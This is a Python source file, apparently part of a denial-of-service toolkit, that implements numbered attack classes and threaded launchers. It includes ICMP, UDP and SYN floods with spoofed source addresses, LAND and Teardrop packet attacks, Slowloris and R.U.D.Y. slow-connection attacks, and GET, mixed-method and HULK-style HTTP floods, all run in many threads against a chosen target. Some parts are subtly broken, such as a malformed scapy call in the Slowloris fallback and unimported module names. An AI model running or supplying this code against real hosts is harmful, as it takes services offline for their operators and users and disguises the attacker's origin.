#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ui import Green, Blue, Grey, Red, White, Yellow, RESET_COLORS, BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW
from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP, UDP
from threading import Thread
import string
import socket
import sys
import random
from faker import Faker
from user_agent import USER_AGENT

fake = Faker()


def stop(self):
    self.running = False

class ICMP_Flooding(Thread): # 5. ICMP Flooding
    def __init__(self, dst_IP, attack_type):
        Thread.__init__(self)
        self.src_IP = RandIP()
        self.dst_IP = dst_IP
        self.attack_type = attack_type
        self.running = True
        self.data = string.ascii_letters + string.digits

    def run(self):
        while self.running:
            self.icmpf = IP(src=self.src_IP, dst=self.dst_IP, ttl=20) / ICMP() / (self.data)
            send(self.icmpf, verbose=0)

class Get_Flooding(Thread):  # 11. GET Flooding
    def __init__(self, src_IP, dst_IP, attack_type, dst_port, url):
        Thread.__init__(self)
        self.src_IP = src_IP
        self.dst_IP = dst_IP
        self.dst_port = dst_port
        self.attack_type = attack_type
        self.url = url
        self.running = True
    def http_header(self):
        self.req_header = f'GET /{self.url} HTTP/1.1\r\n'
        self.req_header += f'Host: {self.src_IP}\r\n'
        self.req_header += f'User-Agent: {random.choice(USER_AGENT)}\r\n'
        self.req_header += '\r\n'
        return self.req_header

    def run(self):
        while self.running:
            try:
                self.req_head = self.http_header()
                self.src_port = int(random.randint(1024, 65535))

                self.syn = IP(dst=self.dst_IP) / TCP(sport=self.src_port, dport=self.dst_port, flags='S')
                self.syn_ack = sr1(self.syn, verbose=0)
                self.ack = IP(dst=self.dst_IP) / TCP(sport=self.src_port, dport=self.dst_port,
                                                                     seq=self.syn_ack[TCP].ack,
                                                                     ack=self.syn_ack[TCP].seq + 1, flags='A') / self.req_head
                send(self.ack, verbose=0)

            except Exception as e:
                print('error:', e)
                break


class LAND(Thread):  # 7. LAND Attack
    def __init__(self, dst_IP, attack_type, dst_port):
        Thread.__init__(self)
        self.dst_IP = dst_IP
        self.dst_port = dst_port
        self.attack_type = attack_type
        self.running = True
        self.data = string.ascii_letters + string.digits
        self.attack = None

    def run(self):
        while self.running:
            try:
                self.attack = IP(src=self.dst_IP, dst=self.dst_IP) / TCP(sport=self.dst_port,
                                                                         dport=self.dst_port) / self.data

                send(self.attack, verbose=False)
            except Exception as e:
                print(Red + 'Error:', e)
                break


class AttackThread(Thread):  # 4. UDP, 6.SYN
    def __init__(self, dst_IP, attack_type, dst_port):
        Thread.__init__(self)
        self.dst_IP = dst_IP
        self.dst_port = dst_port
        self.attack_type = attack_type
        self.running = True
        self.src_port = int(random.randint(1024, 65535))
        self.data = string.ascii_letters + string.digits

    def run(self):
        while self.running:
            if self.attack_type == '4':
                self.attack = IP(src=RandIP(), dst=self.dst_IP) / UDP(sport=self.src_port, dport=self.dst_port) / (self.data)

            elif self.attack_type == '6':  self.attack = IP(src=RandIP(), dst=self.dst_IP) / TCP(flags='S', sport=self.src_port,
                                                                                 dport=self.dst_port) / (self.data)

            send(self.attack, verbose=False)

class HTTP_Method_Flooding(Thread):  # 12. HTTP Method Flooding
    def __init__(self, src_IP, dst_IP, attack_type, dst_port, url):
        Thread.__init__(self)
        self.src_IP = src_IP
        self.dst_IP = dst_IP
        self.dst_port = dst_port
        self.attack_type = attack_type
        self.url = url
        self.running = True
        self.http_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']

    def http_header(self):
        method = random.choice(self.http_methods)
        self.req_header = f'{method} /{self.url} HTTP/1.1\r\n'
        self.req_header += f'Host: {self.src_IP}\r\n'
        self.req_header += f'User-Agent: {random.choice(USER_AGENT)}\r\n'
        self.req_header += '\r\n'
        return self.req_header


    def run(self):
        while self.running:
            try:
                self.req_head = self.http_header()
                self.src_port = int(random.randint(1024, 65535))
                self.syn = IP(dst=self.dst_IP) / TCP(sport=self.src_port, dport=self.dst_port, flags='S')
                # SYN request
                self.syn_ack = sr1(self.syn, verbose=0)
                # syn+ack, initial response from server
                self.ack = IP(dst=self.dst_IP) / TCP(sport=self.src_port, dport=self.dst_port,
                                                     seq=self.syn_ack[TCP].ack,
                                                     ack=self.syn_ack[TCP].seq + 1, flags='A') / self.req_head
                # ACK 3-way handshake
                send(self.ack, verbose=0)

            except Exception as e:
                print(Red + f"\nError: {str(e)}")
                break

class Slow(Thread):  # 9. Slowloris Attack
    def __init__(self, src_IP, dst_IP, attack_type, dst_port, socket_count):
        Thread.__init__(self)
        self.src_IP = src_IP
        self.dst_IP = dst_IP
        self.socket_count = socket_count
        self.dst_port = dst_port
        self.running = True
        self.socket_list = []
        self.s_port = int(random.choice(range(0, 65535)))
        self.attack_type = attack_type
        self.seq = 10000

    def run(self):
        while self.running:
            for _ in range(self.socket_count):
                try:
                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.sock.settimeout(4)
                    self.sock.connect((self.dst_IP, 80))
                    self.socket_list.append(self.sock)


                except socket.error:
                    print('Socket error -> break')
                    break

                self.sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                self.sock.send(f"User-agent: {random.choice(USER_AGENT)}\r\n".encode("utf-8"))
                self.sock.send("Accept-language: en-US,en;q=0.5\r\n".encode('utf-8'))

            while self.running:
                try:
                    for self.sock in self.socket_list:
                        self.sock.send(f"X-a: {(random.randint(1, 5000))}\r\n".encode("utf-8"))
                    time.sleep(10)
                except socket.error:
                    print('Socket error -> restart')
                    self.restart()

    def restart(self):
        self.socket_list = []
        self.scapy_send()

    def scapy_send(self):
        while self.running:
            try:
                self.syn=sr1(IP(dst=self.dst_IP, ttl=20) / TCP(sport=self.s_port, dport=self.dst_port,
                                                       flags='S', seq=self.seq), verbose=0)
                self.next_seq = self.seq + 1
                self.ack = self.syn.seq + 1
                self.ack_packet = TCP(sport=self.s_port, dport=self.dst_port, ack=self.ack, flags='A')
                self.payload = (f"GET /? HTTP/1.1\r\n Host: {self.src_IP}\r\n"
                              + f"User-agent: {random.choice(USER_AGENT)}\r\n" + "Accept-language: en-US,en;q=0.5\r\n"
                              + f"X-a: {(random.randint(1, 5000))}\r\n")
                self.syn = sr1(TCP(sport=self.s_port / self.ack_packet / self.payload, verbose=0))
                self.s_port = int(random.choice(range(0, 65535)))
            except Exception as e:
                print('Scapy error:', e)
                print('break')
                break

class Rudy(Thread):  # 10. Rudy Attack
    def __init__(self, dst_IP, attack_type, dst_port):
        Thread.__init__(self)
        self.dst_IP = dst_IP
        self.dst_port = dst_port
        self.attack_type = attack_type
        self.running = True

    def run(self):
        while self.running:
            try:
                self.payload1 = bytes("POST / HTTP/1.1\r\n", encoding='utf-8')
                self.payload2 = bytes(f"Host: {self.dst_IP} \r\n", encoding='utf-8')
                self.payload3 = bytes(f"User-Agent: {random.choice(USER_AGENT)}\r\n", encoding='utf-8')
                self.payload4 = bytes("Connection: keep-alive\r\n", encoding='utf-8')
                self.payload5 = bytes("Content-Length: 100000\r\n\r\n", encoding='utf-8')
                self.payload = self.payload1 + self.payload2 + self.payload3 + self.payload4 + self.payload5

                self.socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socks.connect((self.dst_IP, self.dst_port))
                self.socks.send(self.payload)

                for i in range(0, 9999):
                    string = "A".encode('utf-8')
                    self.socks.send(string)
                    time.sleep(10)
                self.socks.close()

            except Exception as e:
                print(Red + f"\nError: {str(e)}")
                break

class Teardrop(Thread):  # 8. Teardrop Attack
    def __init__(self, dst_IP, attack_type, dst_port):
        Thread.__init__(self)
        self.dst_IP = dst_IP
        self.dst_port = dst_port
        self.attack_type = attack_type
        self.running = True
        self.data = "A" * 100

    def run(self):
        while self.running:
            try:
                self.src_IP = str(RandIP())
                self.src_port = int(random.randint(1024, 65535))


                send((IP(src=self.src_IP, dst=self.dst_IP, flags="MF")
                      / UDP(sport=self.src_port, dport=self.dst_port) / self.data), verbose=0)


                send((IP(src=self.src_IP, dst=self.dst_IP,  frag=5, flags="MF")
                     / UDP(sport=self.src_port, dport=self.dst_port) / self.data), verbose=0)


                send((IP(src=self.src_IP, dst=self.dst_IP, frag=10)
                      / UDP(sport=self.src_port, dport=self.dst_port) / self.data), verbose=0)

            except Exception as e:
                print(Red + f"\nError: {str(e)}")
                break

class Hulk(Thread):  # 13. Hulk DoS
    def __init__(self, src_IP, dst_IP, attack_type, dst_port, url):
        Thread.__init__(self)
        self.url = url
        self.src_IP = src_IP
        self.dst_IP = dst_IP
        self.dst_port = dst_port
        self.attack_type = attack_type
        self.param_joiner = ''
        self.running = True

    def par(self, size):
        self.parms = ''
        for _ in range(0, size):
            self.parm = random.randint(65, 90)
            self.parms += chr(self.parm)
        return (self.parms)

    def header(self):
        if self.url.count("?") > 0:
            self.param_joiner = "&"
        else:
            self.param_joiner = "?"

        self.req = self.url + self.param_joiner + self.par(random.randint(3, 8)) + '=' + self.par(random.randint(3, 8))
        self.req_header = f'GET /{self.req} HTTP/1.1\r\n'
        self.req_header += f'Host : {self.src_IP}\r\n'
        self.req_header += f'User-Agent: {random.choice(USER_AGENT)}\r\n'
        self.req_header += '\r\n'

        return self.req_header

    def run(self):
        while self.running:
            try:
                self.req_head = self.header()
                self.src_port = int(random.randint(1024, 65535))
                self.seq = random.choice(range(49152, 65535))
                self.syn = IP(dst=self.dst_IP) / TCP(sport=self.src_port, dport=self.dst_port, flags='S')
                # .syn 요청
                self.syn_ack = sr1(self.syn, verbose=0)
                # syn+ack 즉, 서버의 첫 응답 값
                self.ack = IP( dst=self.dst_IP) / TCP(sport=self.src_port, dport=self.dst_port,
                                                                      seq=self.syn_ack[TCP].ack,
                                                                      ack=self.syn_ack[TCP].seq + 1, flags='A') / self.req_head
                # ACK 3way-handshake
                send(self.ack, verbose=0)


            except Exception as e:
                print(Red + f"\nError: {str(e)}")
                break


def DoS_num1(dst_IP, attack_type, run_threads, dst_port):
    threads = []
    stop_event = threading.Event()

    try:
        print(Red + "Attack started. Press Ctrl+C to stop.")
        for _ in range(run_threads):
            if attack_type == '6':  # SYN Flooding
                attack_thread = AttackThread(dst_IP, '6', dst_port)
            elif attack_type == '4':  # UDP Flooding
                attack_thread = AttackThread(dst_IP, '4', dst_port)
            elif attack_type == '10':  # Rudy
                attack_thread = Rudy(dst_IP, '10', dst_port)
            elif attack_type == '8':  # Teardrop
                attack_thread = Teardrop(dst_IP, '8', dst_port)
            elif attack_type == '7':
                attack_thread = LAND(dst_IP, '7', dst_port)

            threads.append(attack_thread)
            attack_thread.start()

        while not stop_event.is_set():
            stop_event.wait(1)

    except KeyboardInterrupt:
        print(Blue + "\nStopping attack..." + Grey)
        stop_event.set()


    finally:
        for thread in threads:
            if hasattr(thread, 'stop'):
                thread.stop()
            thread.running = False

        # Wait for threads to complete
        for thread in threads:
            thread.join()


def DoS_num2(src_IP, dst_IP, attack_type, run_threads, dst_port, url):
    threads = []
    stop_event = threading.Event()

    try:
        print(Red + "Attack started. Press Ctrl+C to stop.")
        for _ in range(run_threads):
            if attack_type == '11':  # GET Flooding
                attack_thread = Get_Flooding(src_IP, dst_IP, '11',  dst_port, url)
            elif attack_type == '12':  # HTTP Flooding
                attack_thread = HTTP_Method_Flooding(src_IP, dst_IP, '12', dst_port, url)
            elif attack_type == '13':  # 13. Hulk Dos
                attack_thread = Hulk(src_IP, dst_IP, '13', dst_port, url)

            threads.append(attack_thread)
            attack_thread.start()

        while not stop_event.is_set():
            stop_event.wait(1)

    except KeyboardInterrupt:
        print(Blue + "\nStopping attack..." + Grey)
        stop_event.set()


    finally:
        for thread in threads:
            if hasattr(thread, 'stop'):
                thread.stop()
            thread.running = False

        # Wait for threads to complete
        for thread in threads:
            thread.join()


def DoS_num3(dst_IP, attack_type, run_threads):
    threads = []
    stop_event = threading.Event()

    try:
        print(Red + "Attack started. Press Ctrl+C to stop.")
        for _ in range(run_threads):
            if attack_type == '5':  # 5. ICMP Flooding
                attack_thread = ICMP_Flooding(dst_IP, '5')

            threads.append(attack_thread)
            attack_thread.start()

        while not stop_event.is_set():
            stop_event.wait(1)

    except KeyboardInterrupt:
        print(Blue + "\nStopping attack..." + Grey)
        stop_event.set()


    finally:
        for thread in threads:
            if hasattr(thread, 'stop'):
                thread.stop()
            thread.running = False

        # Wait for threads to complete
        for thread in threads:
            thread.join()


def DoS_num4(src_IP, dst_IP, attack_type, run_threads, dst_port, socket_count):
    threads = []
    stop_event = threading.Event()

    try:
        print(Red + "Attack started. Press Ctrl+C to stop.")
        for _ in range(run_threads):
            if attack_type == '9':  # 9. Slowloris
                attack_thread = Slow(src_IP, dst_IP, '9', dst_port, socket_count)

            threads.append(attack_thread)
            attack_thread.start()

        while not stop_event.is_set():
            stop_event.wait(1)

    except KeyboardInterrupt:
        print(Blue + "\nStopping attack..." + Grey)
        stop_event.set()

    except socket.error:
        print(Red + "\nCouldn't connect to server")
        sys.exit()


    finally:
        for thread in threads:
            if hasattr(thread, 'stop'):
                thread.stop()
            thread.running = False

        # Wait for threads to complete
        for thread in threads:
            thread.join()



